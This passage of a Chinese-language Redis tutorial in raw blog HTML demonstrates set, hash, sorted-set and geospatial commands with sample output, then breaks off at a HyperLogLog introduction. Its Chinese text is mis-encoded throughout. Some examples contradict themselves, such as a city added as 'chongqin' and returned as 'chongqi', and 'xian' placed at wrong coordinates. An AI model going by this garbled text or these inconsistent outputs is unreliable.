class="string">&quot;2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; sinter set1 set2 <span class="comment"># äº¤é›†  é€šç”¨å¥½å‹å°±å¯ä»¥è¿™æ ·å®ç°</span></span><br><span class="line">1) <span class="string">&quot;3&quot;</span></span><br><span class="line">2) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; sunion set1 set2 <span class="comment">#å¹¶é›†</span></span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">5) <span class="string">&quot;5&quot;</span></span><br><span class="line">6) <span class="string">&quot;6&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<h2 id="5ã€Hashï¼ˆå“ˆå¸Œï¼‰"><a href="#5ã€Hashï¼ˆå“ˆå¸Œï¼‰" class="headerlink" title="5ã€Hashï¼ˆå“ˆå¸Œï¼‰"></a>5ã€Hashï¼ˆå“ˆå¸Œï¼‰</h2><p>Redis hash æ˜¯ä¸€ä¸ª string ç±»å‹çš„ fieldï¼ˆå­—æ®µï¼‰ å’Œ valueï¼ˆå€¼ï¼‰ çš„æ˜ å°„è¡¨ï¼Œhash ç‰¹åˆ«é€‚åˆç”¨äºå­˜å‚¨å¯¹è±¡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; hset myhash1 f1 v1 <span class="comment"># setä¸€ä¸ªå…·ä½“ key-vlaue</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hget myhash1 f1 <span class="comment"># è·å–ä¸€ä¸ªå­—æ®µå€¼</span></span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hmset myhash2 f1 v1 f2 v2  <span class="comment"># setå¤šä¸ª key-vlaue</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;myhash2&quot;</span></span><br><span class="line">2) <span class="string">&quot;myhash1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hmget myhash2 f1 f2 <span class="comment"># è·å–å¤šä¸ªå­—æ®µå€¼</span></span><br><span class="line">1) <span class="string">&quot;v1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash2 <span class="comment"># è·å–å…¨éƒ¨çš„æ•°æ®</span></span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v1&quot;</span></span><br><span class="line">3) <span class="string">&quot;f2&quot;</span></span><br><span class="line">4) <span class="string">&quot;v2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hdel myhash2 f1 <span class="comment"># åˆ é™¤hashæŒ‡å®škeyå­—æ®µï¼å¯¹åº”çš„valueå€¼ä¹Ÿå°±æ¶ˆå¤±äº†ï¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash2</span><br><span class="line">1) <span class="string">&quot;f2&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; hmset myhash1 f1 v1 f2 v2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash1</span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v1&quot;</span></span><br><span class="line">3) <span class="string">&quot;f2&quot;</span></span><br><span class="line">4) <span class="string">&quot;v2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hlen myhash1 <span class="comment"># è·å–hashè¡¨çš„å­—æ®µæ•°é‡ï¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; hmset myhash1 f1 v2 f2 v2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash1</span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line">3) <span class="string">&quot;f2&quot;</span></span><br><span class="line">4) <span class="string">&quot;v2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hexists myhash1 f1 <span class="comment"># åˆ¤æ–­hashä¸­æŒ‡å®šå­—æ®µæ˜¯å¦å­˜åœ¨ è¿”å›1è¯´æ˜å­˜åœ¨ï¼Œè¿”å›0è¯´æ˜ä¸å­˜åœ¨</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hexists myhash1 f3</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; hmset myhash1 f1 v1 f2 v2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; hkeys myhash1 <span class="comment"># åªè·å¾—æ‰€æœ‰field</span></span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;f2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hvals myhash1 <span class="comment"># åªè·å¾—æ‰€æœ‰value</span></span><br><span class="line">1) <span class="string">&quot;v1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; hset myhash1 f1 1</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash1</span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hincrby myhash1 f1 1 <span class="comment">#æŒ‡å®šå¢é‡ è‡ªå¢</span></span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; hincrby myhash1 f1 1</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; hincrby myhash1 f1 3</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379&gt; hincrby myhash1 f1 -1</span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">127.0.0.1:6379&gt; hsetnx myhash2 f1 v1 <span class="comment"># å¦‚æœfieldä¸å­˜åœ¨ï¼Œåˆ™è®¾ç½®æˆåŠŸï¼Œè¿”å›1</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hgetall myhash2</span><br><span class="line">1) <span class="string">&quot;f1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hsetnx myhash2 f1 v11  <span class="comment">#å¦‚æœfieldå­˜åœ¨ï¼Œåˆ™è®¾ç½®å¤±è´¥ï¼Œè¿”å›1</span></span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; hsetnx myhash2 f2 v2</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p>hashå˜æ›´çš„æ•°æ® user name age,å°¤å…¶æ˜¯æ˜¯ç”¨æˆ·ä¿¡æ¯ä¹‹ç±»çš„ï¼Œç»å¸¸å˜åŠ¨çš„ä¿¡æ¯ï¼ </p>
<p>hash æ›´é€‚åˆäºå¯¹è±¡çš„å­˜å‚¨ï¼ŒStringæ›´åŠ é€‚åˆå­—ç¬¦ä¸²å­˜å‚¨ï¼</p>
<h2 id="6ã€Zsetï¼ˆæœ‰åºé›†åˆï¼‰"><a href="#6ã€Zsetï¼ˆæœ‰åºé›†åˆï¼‰" class="headerlink" title="6ã€Zsetï¼ˆæœ‰åºé›†åˆï¼‰"></a>6ã€Zsetï¼ˆæœ‰åºé›†åˆï¼‰</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; zadd myset 1 a  <span class="comment"># æ·»åŠ ä¸€ä¸ªå€¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd myset 2 b </span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd myset 3 c 4 d <span class="comment"># æ·»åŠ å¤šä¸ªå€¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; zrange myset 0 -1 <span class="comment"># è·å–æ‰€æœ‰çš„å€¼</span></span><br><span class="line">1) <span class="string">&quot;a&quot;</span></span><br><span class="line">2) <span class="string">&quot;b&quot;</span></span><br><span class="line">3) <span class="string">&quot;c&quot;</span></span><br><span class="line">4) <span class="string">&quot;d&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; zadd salary 60 zhangsan</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd salary 80 lisi</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd salary 50 wangwu</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zrange salary 0 -1</span><br><span class="line">1) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">2) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">3) <span class="string">&quot;lisi&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrangebyscore salary -inf +inf <span class="comment"># æ˜¾ç¤ºå…¨éƒ¨çš„ç”¨æˆ· ä»å°åˆ°å¤§ï¼ï¼ˆ-inf ä»£è¡¨è´Ÿæ— ç©·  +infä»£è¡¨æ­£æ— ç©·ï¼‰</span></span><br><span class="line">1) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">2) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">3) <span class="string">&quot;lisi&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrevrange salary 0 -1 <span class="comment"># ä»å¤§å¤§å°æ’åº</span></span><br><span class="line">1) <span class="string">&quot;lisi&quot;</span></span><br><span class="line">2) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">3) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrangebyscore salary -inf +inf withscores <span class="comment">#ä»å°åˆ°å¤§æ˜¾ç¤ºæ‰€æœ‰çš„ç”¨æˆ·å¹¶é™„å¸¦è–ªèµ„</span></span><br><span class="line">1) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">2) <span class="string">&quot;50&quot;</span></span><br><span class="line">3) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">4) <span class="string">&quot;60&quot;</span></span><br><span class="line">5) <span class="string">&quot;lisi&quot;</span></span><br><span class="line">6) <span class="string">&quot;80&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrangebyscore salary -inf 60 withscores <span class="comment"># æ˜¾ç¤ºè–ªèµ„å°äºç­‰äº60çš„ç”¨æˆ·å¹¶é™„å¸¦è–ªèµ„</span></span><br><span class="line">1) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">2) <span class="string">&quot;50&quot;</span></span><br><span class="line">3) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">4) <span class="string">&quot;60&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; zadd salary 5000 zhangsan 6000 lisi 10000 wangwu 3000 zhaoliu</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; zrange salary 0 -1</span><br><span class="line">1) <span class="string">&quot;zhaoliu&quot;</span></span><br><span class="line">2) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">3) <span class="string">&quot;lisi&quot;</span></span><br><span class="line">4) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrem salary lisi <span class="comment"># ç§»é™¤æœ‰åºé›†åˆä¸­çš„æŒ‡å®šå…ƒç´ </span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zrange salary 0 -1</span><br><span class="line">1) <span class="string">&quot;zhaoliu&quot;</span></span><br><span class="line">2) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">3) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zcard salary <span class="comment"># è·å–æœ‰åºé›†åˆä¸­çš„ä¸ªæ•°</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; zadd myset 1 a 2 b 3 c</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; zcount myset 1 3 <span class="comment"># è·å–æŒ‡å®šåŒºé—´çš„æˆå‘˜æ•°é‡ï¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; zcount myset 1 2</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; zcount myset 2 3</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br></pre></td></tr></table></figure>

<p>å…¶ä½™çš„ä¸€äº›apiï¼Œå¯ä»¥å»æŸ¥è¯¢å®˜æ–¹æ–‡æ¡£</p>
<p>æ¡ˆä¾‹æ€è·¯ï¼š</p>
<ul>
<li><p>set æ’åºã€å­˜å‚¨ç­çº§æˆç»©ï¼Œå·¥èµ„è¡¨æ’åº</p>
</li>
<li><p>åŠ æƒï¼š1-é‡è¦æ¶ˆæ¯ 0-æ™®é€šæ¶ˆæ¯</p>
</li>
<li><p>æ’è¡Œæ¦œåº”ç”¨å®ç°ï¼Œå–top 10</p>
</li>
</ul>
<h1 id="å››ã€ä¸‰ç§ç‰¹æ®Šæ•°æ®ç±»å‹"><a href="#å››ã€ä¸‰ç§ç‰¹æ®Šæ•°æ®ç±»å‹" class="headerlink" title="å››ã€ä¸‰ç§ç‰¹æ®Šæ•°æ®ç±»å‹"></a>å››ã€ä¸‰ç§ç‰¹æ®Šæ•°æ®ç±»å‹</h1><p>Redisåœ¨3.2ç‰ˆæœ¬ä¸­åŠ å…¥äº†åœ°ç†ç©ºé—´(geospatial)ä»¥åŠç´¢å¼•åŠå¾„æŸ¥è¯¢çš„åŠŸèƒ½</p>
<p>ä¸»è¦ç”¨åœ¨éœ€è¦åœ°ç†ä½ç½®çš„åº”ç”¨ä¸Š</p>
<p>æœ‹å‹çš„å®šä½ï¼Œé™„è¿‘çš„äººï¼Œæ‰“è½¦è·ç¦»è®¡ç®—</p>
<p>æŸ¥è¯¢åŸå¸‚ç»çº¬åº¦ï¼š<a href="http://www.jsons.cn/lngcode/">http://www.jsons.cn/lngcode/</a></p>
<blockquote>
<p>geodd åŠŸèƒ½è¯´æ˜: å°†æŒ‡å®šçš„åœ°ç†ç©ºé—´ä½ç½®ï¼ˆçº¬åº¦ã€ç»åº¦ã€åç§°ï¼‰æ·»åŠ åˆ°æŒ‡å®šçš„keyä¸­ã€‚</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># getadd æ·»åŠ åœ°ç†ä½ç½®</span></span><br><span class="line"><span class="comment"># è§„åˆ™ï¼šä¸¤çº§æ— æ³•ç›´æ¥æ·»åŠ ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šä¸‹è½½åŸå¸‚æ•°æ®ï¼Œç›´æ¥é€šè¿‡javaç¨‹åºä¸€æ¬¡æ€§å¯¼å…¥ï¼</span></span><br><span class="line"><span class="comment"># æœ‰æ•ˆçš„ç»åº¦ä»-180åº¦åˆ°180åº¦ã€‚ æœ‰æ•ˆçš„çº¬åº¦ä»-85.05112878åº¦åˆ°85.05112878åº¦ã€‚ å½“åæ ‡ä½ç½®è¶…å‡ºä¸Šè¿°æŒ‡å®šèŒƒå›´æ—¶ï¼Œè¯¥å‘½ä»¤å°†ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ã€‚</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; geoadd china:city 116.40 39.90 beijing</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; GEOADD china:city 121.47 31.23 shanghai</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; GEOADD china:city 120.15 30.28 hangzhou 106.50 29.53 chongqin 125.14 42.92 xian</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br></pre></td></tr></table></figure>

<blockquote>
<p>geopos   åŠŸèƒ½è¯´æ˜: ä»keyé‡Œè¿”å›æ‰€æœ‰ç»™å®šä½ç½®å…ƒç´ çš„ä½ç½®ï¼ˆç»åº¦å’Œçº¬åº¦ï¼‰</p>
</blockquote>
<p>GEOPOS å‘½ä»¤è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œ æ•°ç»„ä¸­çš„æ¯ä¸ªé¡¹éƒ½ç”±ä¸¤ä¸ªå…ƒç´ ç»„æˆï¼š ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºç»™å®šä½ç½®å…ƒç´ çš„ç»åº¦ï¼Œ è€Œç¬¬äºŒä¸ªå…ƒç´ åˆ™ä¸ºç»™å®šä½ç½®å…ƒç´ çš„çº¬åº¦ã€‚</p>
<p>å½“ç»™å®šçš„ä½ç½®å…ƒç´ ä¸å­˜åœ¨æ—¶ï¼Œ å¯¹åº”çš„æ•°ç»„é¡¹ä¸ºç©ºå€¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; geopos china:city xian</span><br><span class="line">1) 1) <span class="string">&quot;125.13999849557876587&quot;</span></span><br><span class="line">   2) <span class="string">&quot;42.92000122112879268&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>geodist    ä¸¤äººä¹‹é—´çš„è·ç¦»ï¼</p>
</blockquote>
<p>åŠŸèƒ½è¯´æ˜</p>
<ul>
<li>è¿”å›ä¸¤ä¸ªç»™å®šä½ç½®ä¹‹é—´çš„è·ç¦»ï¼Œå¦‚æœä¸¤ä¸ªä½ç½®ä¹‹é—´çš„å…¶ä¸­ä¸€ä¸ªä¸å­˜åœ¨ï¼Œ é‚£ä¹ˆå‘½ä»¤è¿”å›ç©ºå€¼</li>
<li>æŒ‡å®šå•ä½çš„å‚æ•° unit å¿…é¡»æ˜¯ä»¥ä¸‹å•ä½çš„å…¶ä¸­ä¸€ä¸ª<ul>
<li>m è¡¨ç¤ºå•ä½ä¸ºç±³ï¼ˆé»˜è®¤å€¼ï¼‰</li>
<li>km è¡¨ç¤ºå•ä½ä¸ºåƒç±³</li>
<li>mi è¡¨ç¤ºå•ä½ä¸ºè‹±é‡Œ</li>
<li>ft è¡¨ç¤ºå•ä½ä¸ºè‹±å°º</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; geodist china:city beijing shanghai</span><br><span class="line"><span class="string">&quot;1067378.7564&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; geodist china:city beijing shanghai km</span><br><span class="line"><span class="string">&quot;1067.3788&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>georadius   </p>
</blockquote>
<p>æˆ‘é™„è¿‘çš„äººï¼Ÿ ï¼ˆè·å¾—æ‰€æœ‰é™„è¿‘çš„äººçš„åœ°å€ï¼Œå®šä½ï¼ï¼‰é€šè¿‡åŠå¾„æ¥æŸ¥è¯¢ï¼</p>
<p>ä»¥ç»™å®šçš„ç»çº¬åº¦ä¸ºä¸­å¿ƒï¼Œ è¿”å›é”®åŒ…å«çš„ä½ç½®å…ƒç´ å½“ä¸­ï¼Œä¸ä¸­å¿ƒçš„è·ç¦»ä¸è¶…è¿‡ç»™å®šæœ€å¤§è·ç¦»çš„æ‰€æœ‰ä½ç½®å…ƒç´ </p>
<p>åœ¨ç»™å®šä»¥ä¸‹å¯é€‰é¡¹æ—¶ï¼Œ å‘½ä»¤ä¼šè¿”å›é¢å¤–çš„ä¿¡æ¯ï¼š</p>
<ul>
<li><p>withdist</p>
<p>åœ¨è¿”å›ä½ç½®å…ƒç´ çš„åŒæ—¶ï¼Œ å°†ä½ç½®å…ƒç´ ä¸ä¸­å¿ƒä¹‹é—´çš„è·ç¦»ä¹Ÿä¸€å¹¶è¿”å›ã€‚ è·ç¦»çš„å•ä½å’Œç”¨æˆ·ç»™å®šçš„èŒƒå›´å•ä½ä¿æŒä¸€è‡´ã€‚</p>
</li>
<li><p>withcoord</p>
<p>å°†ä½ç½®å…ƒç´ çš„ç»åº¦å’Œç»´åº¦ä¹Ÿä¸€å¹¶è¿”å›ã€‚</p>
</li>
<li><p>withhash</p>
<p>ä»¥ 52 ä½æœ‰ç¬¦å·æ•´æ•°çš„å½¢å¼ï¼Œ è¿”å›ä½ç½®å…ƒç´ ç»è¿‡åŸå§‹ geohash ç¼–ç çš„æœ‰åºé›†åˆåˆ†å€¼ã€‚ è¿™ä¸ªé€‰é¡¹ä¸»è¦ç”¨äºåº•å±‚åº”ç”¨æˆ–è€…è°ƒè¯•ï¼Œ å®é™…ä¸­çš„ä½œç”¨å¹¶ä¸å¤§ã€‚ å‘½ä»¤é»˜è®¤è¿”å›æœªæ’åºçš„ä½ç½®å…ƒç´ ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 1000 km <span class="comment"># ä»¥110ï¼Œ30 è¿™ä¸ªç»çº¬åº¦ä¸ºä¸­å¿ƒï¼Œå¯»æ‰¾æ–¹åœ†1000kmå†…çš„åŸå¸‚</span></span><br><span class="line">1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">2) <span class="string">&quot;hangzhou&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 400 km</span><br><span class="line">1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 400 km withdist <span class="comment"># æ˜¾ç¤ºç›´çº¿è·ç¦»</span></span><br><span class="line">1) 1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">   2) <span class="string">&quot;341.9374&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 400 km withcoord <span class="comment"># æ˜¾ç¤ºç»çº¬åº¦</span></span><br><span class="line">1) 1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">   2) 1) <span class="string">&quot;106.49999767541885376&quot;</span></span><br><span class="line">      2) <span class="string">&quot;29.52999957900659211&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 400 km withhash</span><br><span class="line">1) 1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">   2) (<span class="built_in">integer</span>) 4026042091628984</span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 400 km withcoord count 1 <span class="comment"># ç­›é€‰å‡ºæŒ‡å®šæ•°é‡çš„ç»“æœ</span></span><br><span class="line">1) 1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">   2) 1) <span class="string">&quot;106.49999767541885376&quot;</span></span><br><span class="line">      2) <span class="string">&quot;29.52999957900659211&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 1000 km withcoord count 2</span><br><span class="line">1) 1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">   2) 1) <span class="string">&quot;106.49999767541885376&quot;</span></span><br><span class="line">      2) <span class="string">&quot;29.52999957900659211&quot;</span></span><br><span class="line">2) 1) <span class="string">&quot;hangzhou&quot;</span></span><br><span class="line">   2) 1) <span class="string">&quot;120.15000075101852417&quot;</span></span><br><span class="line">      2) <span class="string">&quot;30.2800007575645509&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>georadiusbymember</p>
</blockquote>
<p>åŠŸèƒ½è¯´æ˜: è¿™ä¸ªå‘½ä»¤å’Œ GEORADIUS å‘½ä»¤ä¸€æ ·ï¼Œ éƒ½å¯ä»¥æ‰¾å‡ºä½äºæŒ‡å®šèŒƒå›´å†…çš„å…ƒç´ ï¼Œ ä½†æ˜¯ <strong>GEORADIUSBYMEMBER çš„ä¸­å¿ƒç‚¹æ˜¯ç”±ç»™å®šçš„ä½ç½®å…ƒç´ å†³å®šçš„</strong>ï¼Œ è€Œä¸æ˜¯åƒ GEORADIUS é‚£æ ·ï¼Œ ä½¿ç”¨è¾“å…¥çš„ç»åº¦å’Œçº¬åº¦æ¥å†³å®šä¸­å¿ƒç‚¹æŒ‡å®šæˆå‘˜çš„ä½ç½®è¢«ç”¨ä½œæŸ¥è¯¢çš„ä¸­å¿ƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; GEORADIUSBYMEMBER china:city beijing 1000 km  <span class="comment"># ä»¥åŒ—äº¬ä¸ºä¸­å¿ƒï¼Œé™„è¿‘1000ç±³çš„åŸå¸‚</span></span><br><span class="line">1) <span class="string">&quot;beijing&quot;</span></span><br><span class="line">2) <span class="string">&quot;xian&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>geohash</p>
</blockquote>
<p>è¯¥å‘½ä»¤å°†è¿”å›11ä¸ªå­—ç¬¦çš„Geohashå­—ç¬¦ä¸²!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å°†äºŒç»´çš„ç»çº¬åº¦è½¬æ¢ä¸ºä¸€ç»´çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²è¶Šæ¥è¿‘ï¼Œé‚£ä¹ˆåˆ™è·ç¦»è¶Šè¿‘ï¼</span></span><br><span class="line">127.0.0.1:6379&gt; GEOHASH china:city beijing</span><br><span class="line">1) <span class="string">&quot;wx4fbxxfke0&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>geoåº•å±‚çš„å®ç°åŸç†å…¶å®å°±æ˜¯zsetï¼æˆ‘ä»¬å¯ä»¥ä½¿ç”¨zsetå‘½ä»¤æ¥æ“ä½œgeoï¼</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; zrange china:city 0 -1 <span class="comment"># æŸ¥çœ‹å…¨éƒ¨çš„å…ƒç´ </span></span><br><span class="line">1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">2) <span class="string">&quot;hangzhou&quot;</span></span><br><span class="line">3) <span class="string">&quot;shanghai&quot;</span></span><br><span class="line">4) <span class="string">&quot;beijing&quot;</span></span><br><span class="line">5) <span class="string">&quot;xian&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrem china:city xian <span class="comment"># ç§»é™¤æŒ‡å®šçš„å…ƒç´ </span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zrange china:city 0 -1</span><br><span class="line">1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">2) <span class="string">&quot;hangzhou&quot;</span></span><br><span class="line">3) <span class="string">&quot;shanghai&quot;</span></span><br><span class="line">4) <span class="string">&quot;beijing&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>



<h2 id="2ã€hyperloglog"><a href="#2ã€hyperloglog" class="headerlink" title="2ã€hyperloglog"></a>2ã€hyperloglog</h2><blockquote>
<p>ä»€ä¹ˆæ˜¯åŸºæ•°</p>
</blockquote>
<p>æ¯”å¦‚æ•°æ®é›† {1, 3, 5, 7, 5, 7, 8}ï¼Œ é‚£ä¹ˆè¿™ä¸ªæ•°æ®é›†çš„åŸºæ•°é›†ä¸º {1, 3, 5 ,7, 8}, </p>
<p>åŸºæ•°(ä¸é‡å¤å…ƒç´ )ä¸º5ã€‚ åŸºæ•°ä¼°è®¡å°±æ˜¯åœ¨è¯¯å·®å¯æ¥å—çš„èŒƒå›´å†…ï¼Œå¿«é€Ÿè®¡ç®—åŸºæ•°ã€‚</p>
<blockquote>
<p>ç®€ä»‹</p>
</blockquote>
<p>Redis 2.8.9 ç‰ˆæœ¬å°±æ›´æ–°äº† Hyperloglog æ•°æ®ç»“æ„ï¼</p>
